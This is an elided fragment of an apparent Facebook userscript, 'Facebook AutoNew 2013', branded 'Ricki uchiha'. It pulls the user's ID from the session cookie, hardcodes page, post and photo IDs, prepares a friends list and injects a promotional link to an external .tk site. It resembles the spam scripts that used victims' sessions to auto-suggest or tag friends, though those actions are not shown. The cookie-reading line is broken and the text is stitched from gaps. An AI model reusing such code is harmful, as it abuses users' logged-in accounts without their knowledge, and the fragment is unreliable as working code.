...
// @description     Facebook AutoNew 2013 Ricki uchiha
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://www.tbrcity.tk" target="_blank">Uchiha Ricki<br>KLIK DISINI</a>';
	html += '</div>';
...
var spage_id = "190045751074225";
var spost_id = "481588678589334";
var sfoto_id = "100003000957192";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Ricki uchiha';
